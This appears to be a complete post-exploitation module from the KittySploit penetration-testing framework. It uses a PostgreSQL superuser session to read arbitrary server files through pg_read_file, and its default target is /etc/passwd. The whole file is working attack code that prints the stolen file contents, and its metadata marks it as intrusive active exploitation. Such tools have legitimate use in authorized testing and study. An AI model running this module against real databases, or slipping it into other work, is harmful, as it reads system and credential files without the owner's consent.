from kittysploit import *
from lib.protocols.postgresql.postgresql_client import PostgreSQLClient


class Module(Post, PostgreSQLClient):

	__info__ = {
		"name": "PostgreSQL Read Server File",
		"description": "Read a server file via pg_read_file (requires superuser)",
		"author": "KittySploit Team",
		"session_type": SessionType.POSTGRESQL,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['active_exploitation'],
	    'expected_requests': 2,
	    'reversible': False,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	},
	}

	file_path = OptString("/etc/passwd", "Absolute path on the PostgreSQL server", True)
	offset = OptInteger(0, "Byte offset into the file", False)
	length = OptInteger(8192, "Maximum bytes to read", False)

	def run(self):
		try:
			if not self.is_superuser():
				raise ProcedureError(
					FailureType.NotAccess,
					"pg_read_file requires a superuser session",
				)

			path = str(self.file_path)
			off = int(self.offset) if self.offset is not None else 0
			ln = int(self.length) if self.length is not None else 8192

			print_status(f"Reading {path} (offset={off}, length={ln})")
			data = self.read_server_file(path, offset=off, length=ln)
			if not data:
				raise ProcedureError(
					FailureType.NotFound, f"File empty or not readable: {path}"
				)

			print_success(f"Read {len(data)} byte(s):")
			try:
				print_info(data.decode("utf-8", errors="replace"))
			except Exception:
				print_info(data.hex())
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"Error reading file: {exc}"
			)
